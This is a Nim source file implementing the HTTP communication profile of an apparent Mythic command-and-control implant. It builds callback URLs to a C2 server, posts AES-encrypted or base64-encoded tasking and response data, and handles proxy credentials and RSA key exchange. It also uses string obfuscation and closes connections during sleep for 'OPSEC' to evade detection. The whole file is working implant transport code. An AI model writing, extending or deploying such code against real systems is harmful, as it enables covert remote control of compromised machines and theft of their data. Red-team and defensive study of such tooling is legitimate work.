import std/[base64, strutils, json, os]
import ../config
import ../utils/crypto
import ../utils/http_client
import ../utils/debug
import ../utils/strenc

const encryptedExchange {.used.} = static: getEnv(obf("ENCRYPTED_EXCHANGE_CHECK"), "false").toLowerAscii in ["true", "t"]
when encryptedExchange:
  import ../utils/key_exchange

type
  HttpProfile* = ref object
    config: Config
    aesKey: seq[byte]
    aesDecKey: seq[byte]  # Separate key for decryption
    client: HttpClientWrapper

proc newHttpProfile*(): HttpProfile =
  ## Create a new HTTP profile
  result = HttpProfile()
  result.config = getConfig()
  
  debugLog "http", "HTTP Profile: Creating HTTP client wrapper..."
  
  result.client = newClientWrapper()
  
  debugLog "http", "HTTP Profile: HTTP client wrapper created"
  
  # Set User-Agent
  result.client.headers = newHttpHeaders({"User-Agent": result.config.userAgent})
  
  debugLog "http", "HTTP Profile: Set default User-Agent: ", result.config.userAgent
  debugLog "http", "HTTP Profile: Custom headers config length: ", result.config.headers.len
  if result.config.headers.len > 0:
    debugLog "http", "HTTP Profile: Custom headers JSON: ", result.config.headers
  
  # Parse and add custom headers if provided (JSON format)
  if result.config.headers.len > 0:
    debugLog "http", "HTTP Profile: Parsing custom headers..."
    try:
      let headersJson = parseJson(result.config.headers)
      debugLog "http", "HTTP Profile: Custom headers parsed successfully"
      for key, val in headersJson.pairs:
        result.client.headers[key] = val.getStr()
        debugLog "http", "HTTP Profile: Added custom header: ", key, ": ", val.getStr()
    except Exception as e:
      debugLog "http", "HTTP Profile: Failed to parse custom headers: ", e.msg
  
  debugLog "http", "HTTP Profile: Header configuration complete"
  
  # Configure proxy if provided
  if result.config.proxyHost.len > 0 and result.config.proxyPort.len > 0:
    # Use the scheme Mythic provides; default to http:// if none
    var proxyHost = result.config.proxyHost
    var scheme = "http://"
    if proxyHost.startsWith("https://"):
      scheme = "https://"
      proxyHost = proxyHost[8..^1]
    elif proxyHost.startsWith("http://"):
      scheme = "http://"
      proxyHost = proxyHost[7..^1]
    var proxyUrl = scheme & proxyHost & ":" & result.config.proxyPort
    # Add auth if provided
    if result.config.proxyUser.len > 0 and result.config.proxyPass.len > 0:
      proxyUrl = scheme & result.config.proxyUser & ":" & result.config.proxyPass & "@" & 
                 proxyHost & ":" & result.config.proxyPort
    debugLog "http", "HTTP Profile: Configuring proxy: ", proxyUrl
    try:
      result.client = newClientWrapperWithProxy(proxyUrl)
      # Re-apply headers after creating new client with proxy
      result.client.headers = newHttpHeaders({obf("User-Agent"): result.config.userAgent})
      debugLog "http", "HTTP Profile: Re-applied User-Agent after proxy setup"
      if result.config.headers.len > 0:
        try:
          let headersJson = parseJson(result.config.headers)
          for key, val in headersJson.pairs:
            result.client.headers[key] = val.getStr()
            debugLog "http", "HTTP Profile: Re-applied custom header: ", key, ": ", val.getStr()
        except:
          debugLog "http", "HTTP Profile: Failed to re-apply custom headers after proxy setup"
    except:
      debugLog "http", "HTTP Profile: Failed to configure proxy"
  
proc buildUrl(profile: HttpProfile): string =
  ## Build the full callback URL
  var host = profile.config.callbackHost
  var scheme = ""
  
  # Detect and strip any existing scheme from host
  if host.startsWith("https://"):
    scheme = "https"
    host = host[8..^1]
  elif host.startsWith("http://"):
    scheme = "http"
    host = host[7..^1]
  else:
    # No scheme provided, determine from port
    scheme = if profile.config.callbackPort == "443": "https" else: "http"
  
  result = scheme & "://" & host & ":" & 
           profile.config.callbackPort & "/" & profile.config.postUri

proc send*(profile: HttpProfile, data: string, callbackUuid: string = ""): string =
  ## Send data to C2 server
  let url = profile.buildUrl()
  let uuid = if callbackUuid.len > 0: callbackUuid else: profile.config.uuid
  
  debugLog "http", "=== SENDING DATA ==="
  # Try to pretty-print JSON if it's valid JSON and small enough
  try:
    let jsonData = parseJson(data)
    # Only show full JSON for small payloads (< 2KB)
    if data.len < 2048:
      debugLog "http", "Request JSON:"
      debug jsonData.pretty()
    else:
      # For large payloads, show summary
      debugLog "http", "Request: Large payload (", data.len, " bytes)"
      if jsonData.hasKey(obf("action")):
        debugLog "http", "Action: ", jsonData["action"].getStr()
      if jsonData.hasKey(obf("responses")):
        debugLog "http", "Responses count: ", jsonData["responses"].len
  except:
    # Not JSON or parse error, show raw
    debugLog "http", "Request data (first 500 chars): ", data[0..<min(500, data.len)]
  
  # Only encrypt if AES key is available AND we have a callback UUID
  var payload: string
  if profile.aesKey.len > 0 and callbackUuid.len > 0:
    debugLog "http", "Encrypting payload with AES-256-CBC+HMAC"
    debugLog "http", "Data length: ", data.len, " bytes"
    debugLog "http", "AES key length: ", profile.aesKey.len, " bytes"
    debugLog "http", "UUID: ", uuid
    payload = encryptPayload(data, profile.aesKey, uuid)
    debugLog "http", "Encrypted payload length: ", payload.len, " bytes"
  else:
    # No encryption, just base64(UUID + data)
    debugLog "http", "Sending unencrypted payload (Base64 only)"
    debugLog "http", "Data length: ", data.len, " bytes"
    debugLog "http", "UUID: ", uuid
    payload = encode(uuid & data)
    debugLog "http", "Encoded payload length: ", payload.len, " bytes"
  
  debugLog "http", "Sending HTTP POST to: ", url
  debugLog "http", "Payload preview (first 100 chars): ", payload[0..<min(100, payload.len)]
  
  try:
    debugLog "http", "Sending HTTP request..."
    let response = profile.client.postContent(url, payload)
    debugLog "http", "HTTP response received"
    debugLog "http", "Response length: ", response.len, " bytes"
    debugLog "http", "Response preview (first 100 chars): ", response[0..<min(100, response.len)]
    # Decrypt response if AES key is available and we have callback UUID
    if profile.aesKey.len > 0 and callbackUuid.len > 0:
      debugLog "http", "Decrypting response with AES-256-CBC+HMAC"
      result = decryptPayload(response, profile.aesKey)
      debugLog "http", "Decrypted response length: ", result.len, " bytes"
    else:
      # No encryption, decode and skip UUID
      debugLog "http", "Decoding unencrypted response (Base64)"
      let decoded = decode(response)
      if decoded.len > 36:
        result = decoded[36..^1]
      else:
        result = ""    
    # Try to parse and pretty-print response JSON
    if result.len > 0:
      debugLog "http", "=== RECEIVED RESPONSE ==="
      try:
        let jsonResp = parseJson(result)
        # Only show full JSON for small responses (< 2KB)
        if result.len < 2048:
          debugLog "http", "Response JSON:"
          debug jsonResp.pretty()
        else:
          # For large responses, show summary
          debugLog "http", "Response: Large payload (", result.len, " bytes)"
          if jsonResp.hasKey(obf("action")):
            debugLog "http", "Action: ", jsonResp["action"].getStr()
          if jsonResp.hasKey(obf("responses")):
            debugLog "http", "Responses count: ", jsonResp["responses"].len
          if jsonResp.hasKey(obf("tasks")):
            debugLog "http", "Tasks count: ", jsonResp["tasks"].len
      except:
        # Not JSON or parse error, show raw
        debugLog "http", "Response data (first 500 chars): ", result[0..<min(500, result.len)]
  except:
    debugLog "http", "Request failed: ", getCurrentExceptionMsg()
    result = ""

proc setAesKey*(profile: var HttpProfile, key: seq[byte]) =
  ## Set the AES encryption key
  profile.aesKey = key

proc setAesDecKey*(profile: var HttpProfile, key: seq[byte]) =
  ## Set the AES decryption key
  profile.aesDecKey = key

proc hasAesKey*(profile: HttpProfile): bool =
  ## Check if AES key is set
  result = profile.aesKey.len > 0

proc cleanup*(profile: var HttpProfile) =
  ## Close HTTP client connection to avoid keeping ESTABLISHED connections during sleep
  ## Closes underlying socket connections on both Windows and Linux for better OPSEC
  debugLog "http", "HTTP Profile: Cleaning up client connection"
  # Close the httpclient and its connections
  try:
    profile.client.closeWrapper()
    debugLog "http", "HTTP Profile: Client connection closed"
  except:
    debugLog "http", "HTTP Profile: Failed to close client: ", getCurrentExceptionMsg()

proc reconnect*(profile: var HttpProfile) =
  ## Recreate HTTP client connection after cleanup
  ## This ensures we have a fresh connection for the next request on both Windows and Linux
  debugLog "http", "HTTP Profile: Recreating client connection"
  # Recreate client with same settings
  if profile.config.proxyHost.len > 0 and profile.config.proxyPort.len > 0:
    # Use the scheme Mythic provides; default to http:// if none
    var proxyHost = profile.config.proxyHost
    var scheme = "http://"
    if proxyHost.startsWith("https://"):
      scheme = "https://"
      proxyHost = proxyHost[8..^1]
    elif proxyHost.startsWith("http://"):
      scheme = "http://"
      proxyHost = proxyHost[7..^1]
    var proxyUrl = scheme & proxyHost & ":" & profile.config.proxyPort
    if profile.config.proxyUser.len > 0 and profile.config.proxyPass.len > 0:
      proxyUrl = scheme & profile.config.proxyUser & ":" & profile.config.proxyPass & "@" & 
                 proxyHost & ":" & profile.config.proxyPort
    try:
      profile.client = newClientWrapperWithProxy(proxyUrl)
    except:
      debugLog "http", "HTTP Profile: Failed to recreate client with proxy"
      profile.client = newClientWrapper()
  else:
    profile.client = newClientWrapper()
  
  # Reapply headers
  profile.client.headers = newHttpHeaders({obf("User-Agent"): profile.config.userAgent})
  if profile.config.headers.len > 0:
    try:
      let headersJson = parseJson(profile.config.headers)
      for key, val in headersJson.pairs:
        profile.client.headers[key] = val.getStr()
    except:
      discard
  debugLog "http", "HTTP Profile: Client connection recreated"

proc performKeyExchange*(profile: var HttpProfile): tuple[success: bool, newUuid: string] =
  ## Perform RSA key exchange to establish AES session key
  ## Returns (success, newUuid) tuple where newUuid is the callback UUID from server
  ## If encrypted exchange is not required, use the static PSK
  
  # If no encrypted exchange needed, just use the static PSK
  if not profile.config.encryptedExchange:
    debugLog "http", "No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
    # Don't set key yet - will be set after successful checkin
    return (true, "")
  
  # Only compile RSA code if encrypted exchange is enabled at build time
  when not encryptedExchange:
    debugLog "http", "RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
    return (true, "")
  
  # Use shared key exchange implementation
  else:
    # Create a send wrapper that matches the expected signature
    var p = profile  # Create capturable local reference
    proc sendWrapper(data: string, uuid: string): string =
      return p.send(data, uuid)
    
    let exchangeResult = performRsaKeyExchange(profile.config, profile.config.uuid, sendWrapper)
    
    if exchangeResult.success and exchangeResult.sessionKey.len > 0:
      # Set the AES key
      profile.setAesKey(exchangeResult.sessionKey)
      return (true, exchangeResult.newUuid)
    elif exchangeResult.success:
      # No key exchange needed (AESPSK mode)
      return (true, "")
    else:
      debugLog "http", "Key exchange failed: ", exchangeResult.error
      return (false, "")

